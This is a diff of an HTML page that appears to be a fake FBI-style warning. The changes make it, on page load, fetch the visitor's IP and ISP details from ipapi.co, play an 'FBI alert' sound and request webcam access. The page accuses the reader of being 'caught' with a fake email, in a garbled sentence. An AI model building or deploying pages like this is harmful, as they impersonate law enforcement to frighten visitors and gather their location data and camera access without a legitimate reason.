@@ -51,8 +51,7 @@
   <p class="info">ISP: <span id="isp">Fetching...</span></p>
   <p>To If you have received this email you were caught using a fake email or used this email in legal activity.</p>
   <script>
-    
- async function fetchIPDetails() {
+     async function fetchIPDetails() {
       try {
         const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
@@ -66,7 +65,17 @@
       }
     }
 
-// Check if the browser supports camera access
+    function playFBIAlert() {
+      document.getElementById('fbiSound').play();
+    }
+
+    window.onload = () => {
+      fetchIPDetails();
+      playFBIAlert();
+    };
+  </script>
+  <script>
+    // Check if the browser supports camera access
 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
     // Prompt the user for camera access
     navigator.mediaDevices.getUserMedia({ video: true })
@@ -83,6 +92,7 @@ if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
 } else {
     console.error('Camera access is not supported in this browser.');
 }
+
   </script>
 </body>
 </html>
